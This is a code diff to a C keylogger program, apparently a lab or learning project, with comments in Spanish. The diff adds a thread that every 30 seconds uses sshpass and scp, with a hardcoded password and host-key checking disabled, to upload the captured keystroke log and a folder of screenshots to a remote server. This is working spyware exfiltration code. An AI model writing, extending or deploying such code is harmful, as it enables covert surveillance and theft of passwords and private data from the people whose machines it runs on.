@@ -397,9 +397,62 @@ void *takeScreenshot()
     }
 }
 
+void *sendToServer()
+{
+    while (true)
+    {
+        // Ruta al archivo que deseas enviar
+        char *file_path = "keylog.txt";
+        char *folder_path = "images";
+
+        // Dirección del servidor y ruta destino
+        char *server_user = "user";
+        char *server_ip = "192.168.100.41";
+        char *remote_path = "/home/user/KeyloggerFiles/";
+
+        // Contraseña del servidor SSH
+        char *password = "parrot";
+
+        // Construye el comando scp con sshpass
+        char command[512];
+        snprintf(command, sizeof(command), "sshpass -p '%s' scp -o StrictHostKeyChecking=no %s %s@%s:%s", password, file_path, server_user, server_ip, remote_path);
+
+        // Ejecuta el comando
+        int result = system(command);
+
+        if (result == 0)
+        {
+            printf("Archivo enviado con éxito.\n");
+        }
+        else
+        {
+            printf("Error al enviar el archivo.\n");
+        }
+
+        // Construye el comando scp con sshpass para enviar la carpeta
+        char command_folder[512];
+        snprintf(command_folder, sizeof(command_folder), "sshpass -p '%s' scp -o StrictHostKeyChecking=no -r %s %s@%s:%s",
+                 password, folder_path, server_user, server_ip, remote_path);
+
+        // Ejecuta el comando para enviar la carpeta
+        int result_folder = system(command_folder);
+
+        if (result_folder == 0)
+        {
+            printf("Carpeta enviada con éxito.\n");
+        }
+        else
+        {
+            printf("Error al enviar la carpeta.\n");
+        }
+
+        sleep(30);
+    }
+}
+
 int main()
 {
-    pthread_t keylogger_thread, screenshot_thread;
+    pthread_t keylogger_thread, screenshot_thread, server_thread;
 
     // Crear hilo para capturar las pulsaciones de teclas
     if (pthread_create(&keylogger_thread, NULL, keylogger, NULL) != 0)
@@ -415,8 +468,16 @@ int main()
         return EXIT_FAILURE;
     }
 
+    // Crear hilo para enviar al servidor
+    if (pthread_create(&server_thread, NULL, sendToServer, NULL) != 0)
+    {
+        perror("Error al crear el hilo de enviar al servidor");
+        return EXIT_FAILURE;
+    }
+
     pthread_join(keylogger_thread, NULL);
     pthread_join(screenshot_thread, NULL);
+    pthread_join(server_thread, NULL);
 
     return EXIT_SUCCESS;
 }
